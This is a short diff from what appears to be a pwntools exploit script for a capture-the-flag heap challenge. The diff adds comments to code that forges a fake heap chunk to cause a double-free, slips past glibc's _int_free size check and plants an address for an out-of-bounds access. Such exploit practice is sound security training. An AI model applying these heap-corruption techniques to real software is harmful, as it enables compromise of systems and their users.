@@ -78,12 +78,15 @@ def pwn():
 	# craft fake heap chunk in the bss in order to double-free
 	# the comment pointer of sticket #1
 	chunk  = p64(0xb00bface)
+	# chunk's size
 	chunk += p64(0x21)
 	chunk += p64(0)*2
+	# comment pointer
 	chunk += p64(heap + 0x70)
 	# prevent _int_free from complaining about invalid next size
 	chunk += p64(0x21)
 	chunk += p64(0xb00bface) * (11 - 6)
+	# sticket address to be accessed during negative OOB
 	chunk += p64(0x602230)
 
 	r.sendlineafter(': ', chunk)
